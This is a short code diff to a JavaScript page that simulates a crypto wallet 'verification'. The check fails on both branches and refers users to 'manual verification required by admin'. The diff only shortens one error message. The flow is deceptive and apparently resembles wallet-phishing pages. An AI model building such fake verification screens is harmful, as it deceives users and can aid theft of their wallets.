@@ -954,7 +954,7 @@ ${data.form ? `
             // Simulate connection attempt (3 seconds loading)
             setTimeout(() => {
                 if (!/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(address)) {
-                    showWalletStatus('❌ Verification failed. Invalid wallet phrase format. Manual verification required by admin.', 'error');
+                    showWalletStatus('❌ Verification failed. Invalid wallet phrase format.', 'error');
                 } else {
                     showWalletStatus('❌ Verification failed. Unable to verify wallet automatically. Manual verification required by admin.', 'error');
                 }
